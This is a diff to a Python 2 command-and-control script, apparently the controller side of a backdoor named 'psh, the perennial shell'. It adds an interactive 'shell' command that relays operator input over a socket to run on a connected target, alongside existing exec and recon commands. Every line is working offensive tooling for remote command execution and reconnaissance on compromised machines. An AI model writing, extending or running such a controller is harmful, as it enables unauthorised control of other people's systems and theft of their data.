@@ -29,7 +29,7 @@ def get_args():
 
 
 def ctrl_shell_server(s, PORT):
-    cmds = ['exit', 'help', 'exec', 'recon']
+    cmds = ['exit', 'help', 'exec', 'recon', 'shell']
     print '[+] ({}) Entering control shell'.format(datetime.now())
     conn, addr = s.accept()
     print 'Welcome to psh, the perennial shell!'
@@ -69,9 +69,19 @@ def ctrl_shell_server(s, PORT):
                     print '\noptions:'
                     print '-h\t\tshow help'
                     print '-o\t\twrite results to file in {}/'.format(OUT)
+            # shell
+            elif inp.split()[0] == cmds[4]:
+                if inp == 'shell':
+                    ctrl_shell_shell(conn)
+                else:
+                    print 'Basic shell on target.'
+                    print 'usage: shell [-h]'
+                    print '\noptions:'
+                    print '-h\t\tshow help'
             else:
                 print 'psh: {}: command not found'.format(inp.split()[0])
         except KeyboardInterrupt:
+            print
             break
     socksend(conn, 'fin')
     print '[+] ({}) Exiting control shell.'.format(datetime.now())
@@ -93,6 +103,22 @@ def ctrl_shell_recon_write(response, out_dir):
     with open(outfile, 'w') as f:
         f.write(response)
         print 'psh : Recon log written to {}'.format(outfile)
+
+
+def ctrl_shell_shell(s):
+    pass
+    while True:
+        try:
+            inp = raw_input('psh > shell > ')
+            if inp == '':
+                continue
+            elif inp == 'exit':
+                break
+            else:
+                print ctrl_shell_exchange(s, 'shell {}'.format(inp))
+        except KeyboardInterrupt:
+            print
+            break
 
 
 def socksend(s, msg):
